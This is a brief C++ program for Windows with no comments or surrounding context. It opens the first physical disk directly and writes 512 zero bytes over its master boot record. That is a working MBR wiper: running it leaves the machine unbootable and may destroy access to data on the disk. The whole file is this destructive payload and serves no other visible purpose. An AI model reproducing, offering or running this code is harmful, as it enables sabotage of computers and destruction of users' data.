#include <Windows.h>
#include <iostream>

using namespace std;

int main()
{
	char mbrData[512];
	ZeroMemory(&mbrData, (sizeof mbrData));
	HANDLE MBR = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
	DWORD write;
	WriteFile(MBR, mbrData, 512, &write, NULL);
	CloseHandle(MBR);
}
